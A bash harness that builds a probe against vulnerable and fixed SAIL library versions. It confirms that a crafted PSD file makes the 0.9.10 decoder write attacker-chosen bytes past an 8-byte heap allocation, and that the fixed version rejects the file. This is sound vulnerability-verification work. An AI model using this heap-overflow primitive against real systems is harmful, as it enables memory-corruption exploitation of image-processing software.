#!/usr/bin/env bash
# Bounded rung-4 mechanics: exact-size synthetic slots expose the real PSD
# decoder's chosen writes immediately after its 8-byte pixel allocation.
set -u
cd "$(dirname "$0")"
mkdir -p evidence

pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
need() { grep -Fq -- "$2" "$1" 2>/dev/null; }

probe_sha=f61b4efcff7e5e9a0cd103b7905365003fcd8b7c8b2e4c62382cc6e83750fafa
[ "$(sha256sum probe.c | cut -d' ' -f1)" = "$probe_sha" ] \
    && ok "pin probe.c" || bad "pin probe.c"

bash run-all.sh > evidence/run-all.log 2>&1 \
    && ok "base ASan/control matrix" || bad "base ASan/control matrix"

compile_probe() {
    tag=$1; src=$2
    cflags="-g -O0"
    [ "$src" = sail-1.0.0 ] && cflags="$cflags -I$PWD/stubs"
    gcc $cflags -I "$src/src" -I "build-$tag/include" probe.c \
        -Wl,--wrap=sail_malloc -Wl,--wrap=sail_free \
        -Wl,--start-group build-$tag/src/sail/libsail.a \
        build-$tag/src/sail-codecs-archive/libsail-codecs.a \
        build-$tag/src/sail-common/libsail-common.a \
        build-$tag/src/sail-manip/libsail-manip.a -Wl,--end-group \
        -lm -o "evidence/$tag-probe" 2> "evidence/compile-$tag-probe.log"
}
compile_probe vuln-plain sail-0.9.10 && ok "compile vulnerable probe" || bad "compile vulnerable probe"
compile_probe fixed-plain sail-1.0.0 && ok "compile fixed probe" || bad "compile fixed probe"

echo "== rung 4 limited: chosen bytes past allocation =="
./evidence/vuln-plain-probe evidence/attack.psd > evidence/probe-vuln-attack.out 2>&1
rc=$?
[ "$rc" -eq 0 ] && ok "vulnerable probe attack rc=0" || bad "vulnerable probe attack rc=$rc"
if grep -Eq 'data=[0-9a-f]{14}10 guard=11121314151617cc' evidence/probe-vuln-attack.out \
   && [ "$(grep -Ec 'guard=11121314151617cc' evidence/probe-vuln-attack.out)" -eq 1 ]; then
    ok "one pixel slot has chosen 11..17 at offsets 8..14 and cc at offset 15"
else
    bad "chosen guard bytes not observed exactly once"
fi

echo "== controls =="
for spec in 'vuln-plain evidence/safe-depth1.psd' 'fixed-plain evidence/attack.psd' 'fixed-plain evidence/safe-depth1.psd'; do
    set -- $spec
    out="evidence/probe-$1-$(basename "$2" .psd).out"
    "./evidence/$1-probe" "$2" > "$out" 2>&1
    rc=$?
    if [ "$1" = fixed-plain ] && [ "$2" = evidence/attack.psd ]; then
        [ "$rc" -ne 0 ] && ok "fixed probe rejects attack rc=$rc" || bad "fixed probe accepted attack"
    else
        [ "$rc" -eq 0 ] && ok "$1 probe $(basename "$2") rc=0" || bad "$1 probe $(basename "$2") rc=$rc"
    fi
    if grep -Eq 'guard=11121314151617cc' "$out"; then
        bad "$1 $(basename "$2") has chosen overflow bytes"
    else
        ok "$1 $(basename "$2") has no chosen overflow bytes"
    fi
done

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
